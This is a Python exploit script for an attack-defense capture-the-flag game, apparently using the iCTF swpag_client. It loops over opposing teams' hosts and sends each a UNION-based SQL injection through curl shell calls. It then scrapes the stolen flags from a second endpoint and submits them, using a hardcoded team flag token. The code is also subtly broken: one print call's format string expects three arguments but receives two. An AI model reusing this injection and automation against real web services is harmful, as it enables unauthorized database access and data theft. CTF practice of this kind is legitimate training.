#!/usr/bin/env python

import swpag_client
import os

TEAM_IP = "52.37.204.0"                             # Update according to team ip address
TEAM_FLAG_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"            # Update according to team flag token
SERVICE_ID = 1                                      # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Bindevil"                      # Team name
EXCLUDE_HOSTNAME = "team19"                         # Team hostname
TEAM_URL = "http://" + TEAM_IP + "/"
SERVICE_PORT = 10003                                # Exploiting service's port

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    os.system("rm -rf temp && mkdir temp")
    
    for target in team.get_targets(SERVICE_ID):
      flag_id = target["flag_id"]
      hostname = target["hostname"]
      
      # Ignore our own team
      if target["team_name"] == EXCLUDE_TEAM_NAME or hostname == EXCLUDE_HOSTNAME:
        continue
      
      print("Running exploit on {0}:{1} -> {2}".format(hostname, flag_id))
      flag_obtained = None
      os.system("curl -m 2 \"{0}:{1}/kid?first=%25&last=%25'%20UNION%20SELECT%20description%20AS%20data%20from%20parties;--&age=1\" > temp/results{2}.txt".format(hostname, SERVICE_PORT, hostname))
      x = None
      with open("temp/results{0}.txt".format(hostname), "r+") as f:
        x = f.readline()
        x = x[12:]

      os.system("curl -m 2 \"{0}:{1}/find?kid={2}\" > temp/results_flags{3}.txt".format(hostname, SERVICE_PORT, x.strip("\r\n"), hostname))
      y = None
      with open("temp/results_flags{0}.txt".format(hostname), "r+") as f:
          y = f.readline()
          y = y[28:]

      y = y.split(",")
      for flg in y:
          try:
            x = int(flg)
          except ValueError as e:
            if ("FLG" in flg):
              print(team.submit_flag([flg]))
      if (flag_obtained is not None):
        print(team.submit_flag([flag_obtained]))
  except Exception as e:
    print(e)

if __name__ == "__main__":
  main()
